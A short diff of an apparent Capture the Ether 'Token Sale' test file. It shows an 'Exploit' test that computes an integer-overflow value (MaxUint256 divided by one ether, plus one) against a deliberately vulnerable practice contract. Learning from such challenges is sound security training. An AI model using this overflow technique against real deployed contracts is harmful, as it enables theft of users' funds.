@@ -11,7 +11,7 @@ describe('Token Sale', function () {
         const Factory = await ethers.getContractFactory('TokenSaleChallenge', deployer);
         this.tokenSale = await Factory.deploy(attacker.address, {value: ethers.utils.parseUnits("1")});
     });
-    // 0 = x * 1 ether
+    
     it('Exploit', async function () {
         let victimContract = this.tokenSale.connect(attacker);
         const maxValue = (ethers.constants.MaxUint256.div(ethers.utils.parseUnits("1"))).add(ethers.constants.One)
